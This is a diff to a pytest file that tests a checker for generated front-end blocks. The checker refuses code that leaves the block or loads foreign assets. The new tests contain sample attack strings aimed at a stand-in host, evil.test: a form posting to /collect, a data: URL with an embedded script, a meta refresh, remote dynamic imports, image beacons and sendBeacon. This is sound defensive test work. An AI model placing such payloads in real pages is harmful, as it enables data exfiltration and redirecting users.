@@ -15,7 +15,8 @@ from app.settings import settings
 pytestmark = pytest.mark.anyio
 
 BLOCK = "src/Block.tsx"
-OURS = "https://res.cloudinary.com/genblocks/image/upload/v1/images/abc123"
+CLOUD = settings.cloudinary_cloud_name or "genblocks"
+OURS = f"https://res.cloudinary.com/{CLOUD}/image/upload/v1/images/abc123"
 
 
 def project(content: str, *, path: str = BLOCK) -> list[SandboxFile]:
@@ -65,6 +66,66 @@ def test_a_picture_from_somewhere_else_is_refused():
     # A reader needs to know where, not just that.
     assert f"{BLOCK}:3" in said(assets)
     assert "images.unsplash.com" in said(assets)
+
+
+def test_an_anchor_to_another_page_is_refused():
+    found = checks.inspect(project('<a href="https://evil.test/reset">Reset</a>'))
+
+    assert found[0].ok is False
+    assert "evil.test" in said(found[0])
+
+
+def test_an_anchor_that_stays_in_the_block_is_allowed():
+    found = checks.inspect(project('<a href="#next">Next</a>'))
+
+    assert found[0].ok is True
+
+
+def test_an_anchor_that_embeds_a_page_is_refused():
+    found = checks.inspect(project('<a href="data:text/html,<script>alert(1)</script>">Go</a>'))
+
+    assert found[1].ok is False
+    assert "data:" in said(found[1])
+
+
+def test_a_form_that_posts_somewhere_is_refused():
+    found = checks.inspect(project('<form action="https://evil.test/collect" />'))
+
+    assert found[1].ok is False
+    assert "posts a form to an address" in said(found[1])
+
+
+@pytest.mark.parametrize(
+    ("line", "what"),
+    [
+        ("<script>alert(1)</script>", "script"),
+        ('<iframe srcdoc="<p>x</p>" />', "iframe"),
+        ('<object data="/x" />', "object"),
+        ('<meta httpEquiv="refresh" content="0;url=https://evil.test" />', "refresh"),
+        ('.band { background-image: image-set("https://evil.test/x.png" 1x); }', "image-set"),
+    ],
+)
+def test_ways_of_leaving_the_block_are_refused(line, what):
+    found = checks.inspect(project(line))
+
+    assert any(not one.ok for one in found)
+    assert what in " ".join(said(one) for one in found)
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "window.location.href = 'https://evil.test';",
+        "location.assign('https://evil.test');",
+        "const one = new Image(); one.src = 'https://evil.test/x';",
+        "await import('https://evil.test/x.js');",
+        "const one = navigator.sendBeacon;",
+    ],
+)
+def test_browser_globals_that_can_leave_the_block_are_refused(line):
+    found = checks.inspect(project(line))
+
+    assert found[1].ok is False
 
 
 def test_a_stylesheet_from_another_host_is_refused():
@@ -121,10 +182,21 @@ def test_a_path_with_a_colon_is_still_a_path():
 
 def test_a_port_does_not_make_our_host_somebody_elses():
     found = checks.inspect(
-        project('<img src="https://res.cloudinary.com:443/genblocks/x.png" alt="" />')
+        project(f'<img src="https://res.cloudinary.com:443/{CLOUD}/x.png" alt="" />')
     )
 
     assert found[0].ok is True
+
+
+def test_another_cloudinary_account_is_somebody_elses(monkeypatch):
+    monkeypatch.setattr(settings, "cloudinary_cloud_name", "ours")
+
+    found = checks.inspect(
+        project('<img src="https://res.cloudinary.com/theirs/image/upload/x.png" alt="" />')
+    )
+
+    assert found[0].ok is False
+    assert "theirs" in said(found[0])
 
 
 def test_credentials_do_not_hide_where_the_request_goes():
